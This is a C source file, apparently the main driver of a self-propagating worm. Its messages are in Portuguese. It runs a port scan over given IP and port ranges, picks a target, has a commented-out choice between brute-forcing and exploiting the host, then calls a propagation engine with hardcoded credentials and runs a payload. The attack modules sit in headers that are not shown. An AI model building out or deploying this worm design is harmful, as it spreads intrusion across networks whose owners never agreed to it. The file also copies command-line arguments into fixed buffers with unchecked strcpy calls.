#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "bruteforce.h"
#include "exploit.h"
#include "payload.h"
#include "portscanner.h"
#include "propagation_engine.h"
#include "target_selection.h"

void main(int argc, char *argv[]){
    char range_ipSeq[100];
    char range_portSeq[100];
    char username[25];
    char pass[25];
    char **paramIPPort;
    unsigned int lenKey;
    int random, success;

    if(argc < 4){
        printf("Entrada incorreta.\n\n");
        fflush(stdout);
        printf("A entrada deve seguir o seguinte modelo: ./recon <ip ou range de ips> <porta ou range de portas> <tamanho da chave>\n");
        fflush(stdout);
        exit(0);
    }

    //Pega os ranges
    strcpy(range_ipSeq, argv[1]);
    strcpy(range_portSeq, argv[2]);
    lenKey = atoi(argv[3]);

    printf("-----------------------------------\n");
    printf("Port Scanner iniciado\n"); 
    printf("-----------------------------------\n");
    
    initPortScanner(range_ipSeq, range_portSeq);
    
    printf("Port Scanner finalizado\n"); 

    srand(time(NULL));
    random = rand();

    paramIPPort = malloc(2*sizeof(char *));
    
    printf("-----------------------------------\n");
    printf("Target Selection iniciado\n"); 
    printf("-----------------------------------\n");
    
    target_selection(paramIPPort);
    
    printf("Target Selection finalizado\n"); 

/*    if(random % 2){
        success = bruteforce(lenKey);
        if(success == 0){
            success = exploit_main(argc, argv, opt);
            if(success == 0){
                printf("Não foi possivel obter acesso.\n");
                exit(0);
            }
        }
    }else{
        success = exploit_main(argc, argv, opt);
        if(success == 0){
            success = bruteforce(lenKey);
            if(success == 0){
                printf("Não foi possivel obter acesso.\n");
                exit(0);
            }
        }
    }*/
    strcpy(username, "kath");
    strcpy(pass, "jack");
    
    printf("-----------------------------------\n");
    printf("Propagation Engine iniciado\n"); 
    printf("-----------------------------------\n");
    
    propagation_engine(paramIPPort[0], username, pass);
    
    printf("-----------------------------------\n");
    printf("Propagation Engine finalizado\n"); 
    
    printf("-----------------------------------\n");
    printf("Payload iniciado\n"); 
    printf("-----------------------------------\n");
    
    payload();
    
    printf("-----------------------------------\n");
    printf("Payload finalizado\n"); 
    printf("-----------------------------------\n");
}
